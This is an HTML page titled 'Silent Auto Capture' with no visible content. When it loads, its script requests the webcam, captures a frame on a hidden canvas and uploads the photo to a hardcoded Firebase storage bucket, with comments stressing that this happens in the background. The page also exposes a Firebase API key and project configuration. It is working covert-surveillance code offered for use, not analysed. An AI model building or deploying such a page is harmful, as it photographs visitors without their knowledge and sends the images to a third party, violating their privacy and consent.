<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Silent Auto Capture</title>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        // ✅ Replace with your Firebase config
        const firebaseConfig = {
           apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
  authDomain: "valute3.firebaseapp.com",
  databaseURL: "https://valute3-default-rtdb.firebaseio.com",
  projectId: "valute3",
  storageBucket: "valute3.appspot.com",
  messagingSenderId: "1059488015525",
  appId: "1:1059488015525:web:db514a29cb876069d2d94c",
  measurementId: "G-VBSCFW4HQP"
        };

        // ✅ Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        async function captureAndUploadPhoto() {
            try {
                // ✅ Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                // ✅ Wait for the video to load
                await new Promise(resolve => (video.onloadedmetadata = resolve));

                // ✅ Create a hidden canvas
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");

                // ✅ Capture image from video
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // ✅ Stop the camera stream
                stream.getTracks().forEach(track => track.stop());

                // ✅ Convert image to Blob and upload
                canvas.toBlob(async (blob) => {
                    const fileName = `images/captured_${Date.now()}.png`;
                    const storageRef = ref(storage, fileName);
                    await uploadBytes(storageRef, blob);

                    // ✅ Get download URL
                    const downloadURL = await getDownloadURL(storageRef);
                    console.log("Image uploaded:", downloadURL);
                }, "image/png");
            } catch (error) {
                console.error("Error capturing image:", error);
            }
        }

        // ✅ Automatically capture and upload photo in background
        window.onload = captureAndUploadPhoto;
    </script>
</head>
<body>
</body>
</html>
